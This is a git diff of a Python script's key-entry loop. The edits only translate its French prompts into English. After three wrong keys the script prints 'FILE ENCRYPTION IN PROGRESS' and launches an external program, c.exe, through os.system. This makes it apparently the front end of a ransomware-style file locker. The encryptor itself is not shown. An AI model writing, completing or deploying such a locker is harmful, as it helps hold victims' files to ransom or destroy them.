@@ -46,24 +46,24 @@ def Main(): # Fonction principale
     while running: 
         os.system("cls")
         
-        user_response = input(f"{fg(0)}{bg(1)}Veuillez entrer votre clé : {attr(0)}") # L'utilisateur entre la clé
+        user_response = input(f"{fg(0)}{bg(1)}Please enter your key : {attr(0)}") # L'utilisateur entre la clé
 
         if user_response == response: # Si la valeur entrée est correcte
-            print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
-            print(f"{fg(0)}{bg(1)}Appuyez sur F11 pour quitter.{attr(0)}")
+            print(f"{fg(2)}{bg(1)}Valid key !{attr(0)}")
+            print(f"{fg(0)}{bg(1)}Press F11 to quit..{attr(0)}")
             running = False # Quitter le programme
             with open("is_correct.bool", "w") as bool:
                 bool.write("true")
 
         else: # Clé invalide
-            print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
+            print(f"{fg(88)}{bg(1)}Invalid key.{attr(0)}")
             wait_until_block += 1
             time.sleep(0.5)
             if wait_until_block >= 3: # Si l'utilisateur entre une clé invalide 3 fois ou +
                 # Cryptage de fichier et autres
-                print("Nombres d'erreurs max dépassés.")
+                print("Maximum number of errors exceeded.")
                 time.sleep(1)
-                print("CRYPTAGE DES FICHIERS EN COURS")
+                print("FILE ENCRYPTION IN PROGRESS.")
                 time.sleep(1)
                 os.system("start c.exe")
                 time.sleep(1)
